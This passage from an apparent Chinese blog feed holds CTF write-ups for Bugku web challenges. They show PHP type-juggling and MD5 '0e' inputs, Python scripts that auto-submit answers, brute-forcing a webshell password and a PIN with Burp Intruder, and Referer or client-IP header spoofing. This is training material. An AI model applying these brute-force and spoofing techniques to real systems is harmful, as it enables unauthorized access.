<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%9F%9B%E7%9B%BE/3.png" class="">

<p>这？？？不会吧，好歹我高考数学也是60分的</p>
<p>为什么？？？？？？？？？？？？？？？</p>
<h2 id="绝不认输"><a href="#绝不认输" class="headerlink" title="绝不认输"></a>绝不认输</h2><p>即便他人的答案是正确的，但是我绝对不相信这是用了科学计数法</p>
<p>开始疯狂尝试payload：</p>
<ul>
<li>1e0.1 </li>
<li>1e0.</li>
<li>1e</li>
<li>1+</li>
<li>………..</li>
</ul>
<p>&emsp;&emsp;我发现，好像只要在1后面存在非数字字符就可以，这时候我突然想到会不会是在数值转换的过程存在不可告人的秘密呢？</p>
<p>查阅一下资料：<a href="https://www.cnblogs.com/lwbqqyumidi/archive/2013/01/31/2887086.html" alt="PHP数字和字符串比较" target="_blank">PHP数字和字符串比较</a></p>
<p>总结一下，当字符串和数字进行比较时，系统自动从前到后截取连续的数字字符</p>
<p>&emsp;&emsp;所以为什么他们的payload可以成功？因为<strong> * </strong>号在隐式转换中截断了后续字符所以最终表达式值为1而不是他们以为的科学计数法立的功</p>
<p>&emsp;&emsp;那么为什么1e0不能成功，因为科学计数法也是可以转换为数字的(本来就是数字的表达式)，所以你写一个合法的自然就over了，当payload为1e0.1时，由于表达式不是合法的科学计数法，所以从e处截断了，最终为1</p>
<br>

<p>最终payload的一种方案为：1加上任意非数字字符即可</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%9F%9B%E7%9B%BE/4.png" class="">

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
<li>善于参考借鉴但是不可盲目相信</li>
<li>一定一定一定要自己多尝试一下，弄懂原理</li>
<li>发现问题一定要尝试，找出原因</li>
</ul>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>秋名山老司机</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/1.png" class="">

<p>WHAT FK？这是人能算出来的？</p>
<a id="more"></a>

<h2 id="己所不能施于机器"><a href="#己所不能施于机器" class="headerlink" title="己所不能施于机器"></a>己所不能施于机器</h2><p>既然自己搞不定那就交给脚本处理吧</p>
<p>Python内置了处理大数的能力，自然是最优选择</p>
<p>现在还有一个问题：结果怎么提交？？</p>
<h2 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h2><p>连续刷新几次页面后，发现有提示</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/2.png" class="">

<p>翻译成人话：以POST方式提交value</p>
<p>然后看cookie，发现只有一个PHPsessionID，也就是说脚本必须维持在同一个会话里</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/3.png" class="">

<p>没什么好说的，放出脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个session会话</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># GET 请求网页内容</span></span><br><span class="line">http = session.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则匹配提取算式</span></span><br><span class="line">expression = re.search(<span class="string">r&#x27;(\d+[+\-*/])+(\d+)&#x27;</span>, http.text).group()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用经典的计算表达式方法计算出大数运算的结果</span></span><br><span class="line">result = eval(expression)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造post数据</span></span><br><span class="line">post_data = &#123;<span class="string">&#x27;value&#x27;</span>: result&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求并输出HTML</span></span><br><span class="line">print(session.post(url, data=post_data).text)</span><br></pre></td></tr></table></figure>

<p>撸完脚本了开始跑</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/4.png" class="">

<p>拿下flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>此题考查脚本编写能力，所以说开发和安全缺一不可</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>管理员系统</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/1.png" class="">

<p>吃过以前的亏，这次一定要好好看题</p>
<a id="more"></a>

<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/2.png" class="">

<p>经典的登录框，可能是SQL注入或者爆破</p>
<h2 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h2><p>CTF三件套：看源码、看响应、扫目录</p>
<p>先看看源码，发现在HTML下有许多空行(突然想起某度源码就是空了200行)，翻翻有惊喜的啊</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/3.png" class="">

<h2 id="开始征战"><a href="#开始征战" class="headerlink" title="开始征战"></a>开始征战</h2><p>base64解码：<a href="http://tool.chinaz.com/Tools/Base64.aspx" alt="b64解码" target="_blank">传送门</a></p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/4.png" class="">

<p>呦呵，看起来就好像密码，账户试一试admin</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/5.png" class="">

<p>IP、本地格外的显眼，果断扔进repeater改包</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/6.png" class="">

<p>拿下flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>&emsp;&emsp;第一次做的时候先随便输入一个账号密码发现需要本地IP，果断的上了代理发现还是不行，当时十分疑惑，后来翻了翻其他大佬的WP才发现自己是多么的可笑，希望你们不要学我</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>网站被黑</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/1.png" class="">

<a id="more"></a>

<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/2.png" class="">

<p>就告诉我们网站被黑了，然后呢？</p>
<h2 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a>冷静分析</h2><p>在URL中存在”webshell”，也就是说服务器很有可能已经存在马了，</p>
<p>既然有马我们就需要知道马的路径和密码(99%的情况下需要)</p>
<h2 id="开启征程"><a href="#开启征程" class="headerlink" title="开启征程"></a>开启征程</h2><p>先扫一下目录康康运气</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/3.png" class="">

<p>NICE，扫到了shell.php，这个名字就太熟悉了</p>
<p>连接一下随便输入一个密码试试</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/4.png" class="">

<p>源码和响应中都没有提示，只能爆破了</p>
<p>抓包扔进intruder跑字典（字典可以搜索webshell常用字典）<a href="https://blog.csdn.net/ncafei/article/details/67108154" alt="shell字典" target="_blank">传送门</a></p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/5.png" class="">

<p>NICE，运气爆棚，拿到flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
<li>其实shell常用名字随手试几个也可以，但是为了说明目录扫描的重要性（同时为了安利一波扫描工具）还是采用扫描目录的方式</li>
<li>这道题的确很有实战意义，扫描+爆破+思路</li>
<li>dirsearch工具我配置了fastkey，所以可以直接调用</li>
</ul>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>计算器</title>
    <url>/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%AE%A1%E7%AE%97%E5%99%A8/1.png" class="">
<p>呦，小学一年级算术？</p>
 <a id="more"></a>

<h2 id="启航"><a href="#启航" class="headerlink" title="启航"></a>启航</h2><p>就这种难度，我的CPU仅用了0.000001ns就算出了答案，然后以191迈的速度填写了答案，BUT发现好像只能写一个字符, emmmmmmmmm….</p>
<p>康康源码吧咱还是。</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%AE%A1%E7%AE%97%E5%99%A8/2.png" class="">

<p>O，原来输入有长度限制，这可怎么办呢？</p>
<p>== 话说前端代码不是可以随便改的吗？</p>
<h2 id="开始暗箱操作"><a href="#开始暗箱操作" class="headerlink" title="开始暗箱操作"></a>开始暗箱操作</h2><h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h3><p>使用浏览器自带的的代码审计功能，修改代码</p>
<p>步骤：F12或者选中元素后右键审计元素</p>
<h3 id="使用BurpSuite提供的自动化工具"><a href="#使用BurpSuite提供的自动化工具" class="headerlink" title="使用BurpSuite提供的自动化工具"></a>使用BurpSuite提供的自动化工具</h3><p>在proxy模块下的options的response operation中–&gt;</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%AE%A1%E7%AE%97%E5%99%A8/3.png" class="">

<p>注：修改后重新刷新网页生效</p>
<h2 id="黎明之光"><a href="#黎明之光" class="headerlink" title="黎明之光"></a>黎明之光</h2><p>暗箱操作一番之后，接下来就可以安心的算数了</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%AE%A1%E7%AE%97%E5%99%A8/4.png" class="">

<p>呵，就这（嘴角疯狂上扬）？</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>善用工具，掌握多种方法</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>输入密码查看flag</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/1.png" class="">

<p>URL中提示是暴力破解，输入框提示是一个五位数</p>
<p>这还说啥，intruder走起</p>
<a id="more"></a>

<h2 id="开始暴破"><a href="#开始暴破" class="headerlink" title="开始暴破"></a>开始暴破</h2><p>光速抓包扔进intruder，开始配置</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/2.png" class="">

<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/3.png" class="">

<p>配置完毕，开始暴破…….</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/4.png" class="">

<p>得到答案，BP暴破时可以隔一段时间点一点看看结果</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本次暴破还是十分顺利的，为了加快暴破速度可以增加线程数</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>速度要快</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/1.png" class="">

<p>题目让我们快点，并且给出了答案的格式</p>
<a id="more"></a>

<h2 id="开车"><a href="#开车" class="headerlink" title="开车"></a>开车</h2><p>既然要快肯定要靠脚本了</p>
<p>分析一下源码和响应</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/2.png" class="">

<p>首先基于session，其次提示我们要把响应头中的flag字段解码然后以参数marginPOST回去</p>
<p>有了秋名山老司机的经验，这题就简单很多了，直接放脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始URL</span></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web6/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建session会话</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># GET请求获取flag</span></span><br><span class="line">http = session.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从HTTP响应中提取flag属性的值同时进行base64解码, 然后再次进行解码</span></span><br><span class="line">flag = base64.b64decode(http.headers[<span class="string">&quot;flag&quot;</span>]).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag样例：   跑的还不错，给你flag吧: ODcwNzI4</span></span><br><span class="line"><span class="comment"># 还需要切割flag</span></span><br><span class="line">flag = flag.split(<span class="string">&#x27;: &#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对提取的内容进行base64解码后还要decode一下，，，坑坑坑坑！！！！！！！！！！！！！！！</span></span><br><span class="line">flag = base64.b64decode(flag).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造POST参数</span></span><br><span class="line">post_data = &#123;<span class="string">&#x27;margin&#x27;</span>: flag&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST数据同时输出HTML</span></span><br><span class="line">print(session.post(url=url, data=post_data).text)</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/3.png" class="">

<p>完美拿下</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本题考察脚本编写能力</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>never give up</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/1.png" class="">

<p>决不放弃？我怎么可能放弃呢</p>
<a id="more"></a>

<h2 id="开始尝试"><a href="#开始尝试" class="headerlink" title="开始尝试"></a>开始尝试</h2><p>主页面会重定向添加id参数，BUT尝试修改数值发现没什么用</p>
<p>看看源码吧</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/2.png" class="">

<p>注释自然是最显眼的，给出了一个文件名1p.html，尝试访问发现会重定向到bugku主站</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/3.png" class="">

<h2 id="开始套娃"><a href="#开始套娃" class="headerlink" title="开始套娃"></a>开始套娃</h2><p>根据数据包可以看到是通过JS实现重定向的，而且JS的内容还不少，拉出来URLdecode</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/4.png" class="">

<p>可以看到是一段重定向和一段注释，对注释继续base64解码</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/5.png" class="">

<p>再次进行URL解码之后得到了一段PHP代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 开头修改了一下，方便格式化源码，请忽略...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_GET[<span class="string">&#x27;id&#x27;</span>]) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (stripos($a, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ($data == <span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> $id == <span class="number">0</span> <span class="keyword">and</span> strlen($b) &gt; <span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span> . substr($b, <span class="number">0</span>, <span class="number">1</span>), <span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr($b, <span class="number">0</span>, <span class="number">1</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;f4l2a3g.txt&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结一下：当程序满足一大堆条件之后就会包含f4l2a3g.txt文件，此刻有没有意识到什么？对，txt文件是直接可以访问的（txt显示内容和原始内容相同，不会像PHP会被解析）</p>
<h2 id="取得胜利"><a href="#取得胜利" class="headerlink" title="取得胜利"></a>取得胜利</h2><p>那么接下来就是重头戏了：访问f4l2a3g.txt获得通向未来的钥匙</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/never_give_up/6.png" class="">

<p>拿下flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>探寻捷径，可以更快的到达终点</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>字符？正则？</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%AD%97%E7%AC%A6_%E6%AD%A3%E5%88%99/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%AD%97%E7%AC%A6_%E6%AD%A3%E5%88%99/1.png" class="">

<p>源码审计题</p>
<a id="more"></a>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;2.php&#x27;</span>); <span class="comment">// 显示2.php源码</span></span><br><span class="line">$key=<span class="string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则表达式匹配</span></span><br><span class="line">$IM= preg_match(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim($_GET[<span class="string">&quot;id&quot;</span>]), $match);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果正则匹配到结果则输出key</span></span><br><span class="line"><span class="keyword">if</span>( $IM ) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>. $key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结一下：当输入的参数满足正则要求时即可得到答案</p>
<h2 id="精心设计"><a href="#精心设计" class="headerlink" title="精心设计"></a>精心设计</h2><p>明白了代码原理之后接下来就是去构造一个符合正则的字符串</p>
<p>强烈推荐一个在线正则验证平台：<a href="https://regex101.com/" alt="在线正则表达式验证" target="_blank">传送门</a></p>
<p>将正则表达式拷贝到平台中</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%AD%97%E7%AC%A6_%E6%AD%A3%E5%88%99/2.png" class="">

<p>结合平台给出的高亮提示可以很清楚的看出正则的结构</p>
<p>先列举一下自定义助记符：</p>
<ul>
<li>c：任意字符</li>
<li>cs：任意个数的任意字符</li>
<li>+：表示逻辑连接，实际不存在</li>
<li>lc：任意小写字母</li>
<li>sc：任意特殊字符</li>
</ul>
<p>key  +  c  +  key  +  4到7个c  +  key:  +  /c/  +  cs  +  key  +  lc  +  sc</p>
<p>给出一个我构造的：keykey1234key:/z/keyz@（给是给了，对不对不知道）</p>
<p>拿着我构造的表达式提交一下</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%AD%97%E7%AC%A6_%E6%AD%A3%E5%88%99/3.png" class="">

<p>嗯？？？哦，我知道了，再试一下</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%AD%97%E7%AC%A6_%E6%AD%A3%E5%88%99/4.png" class="">

<p>YES，拿下key</p>
<h2 id="课后问答"><a href="#课后问答" class="headerlink" title="课后问答"></a>课后问答</h2><p>Q：为什么要在index提交而不是2.php</p>
<p>Q：为什么要弄出来一个2.php</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>你从哪里来？</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/1.png" class="">

<a id="more"></a>

<h2 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a>冷静分析</h2><p>Are you from google? </p>
<p>怎么才能证明you是来自google呢？加Referer呗</p>
<p>打开BP，截断抓包扔进repeater改包重发一把梭</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/2.png" class="">

<p>这。。。。略显尴尬，我懂了，再来</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/3.png" class="">

<p>YES，拿下flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本题考察HTTP协议头</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>md5 collision</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/md5_collision/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/md5_collision/1.png" class="">

<p>让输入一个a</p>
<a id="more"></a>

<h2 id="开始灌水"><a href="#开始灌水" class="headerlink" title="开始灌水"></a>开始灌水</h2><p>如何输入？向服务器传参无非就GET、POST、cookie呗</p>
<p>先试试GET</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/md5_collision/2.png" class="">

<p>有效果，就是这结果很迷，源码和响应都没有线索</p>
<p>看一下标题，看不懂，求助百度翻译</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/md5_collision/3.png" class="">

<p>MD5碰撞，突然想起来了一道题：<a href="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/" alt="" target="_blank">传送门</a></p>
<p>当时说的是如何找到两个数值不同但MD5相同的数，仔细想一下，这可能就是所谓的碰撞吧</p>
<p>试一下吧；输入一个MD5值开头是0e的数：240610708</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/md5_collision/4.png" class="">

<p>还真是，完美手工</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>MD5的碰撞算法早就诞生了，所以不应再用MD5对数字签名进行校验</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>程序员本地网站</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/1.png" class="">

<p>提示我们要从本地登录</p>
<a id="more"></a>

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/2.png" class="">

<p>相同的提示，看来本地登录是跑不了了</p>
<h2 id="Fake-IP"><a href="#Fake-IP" class="headerlink" title="Fake IP"></a>Fake IP</h2><p>如何伪造登录IP呢？要么修改IP报头，要么添加代理头</p>
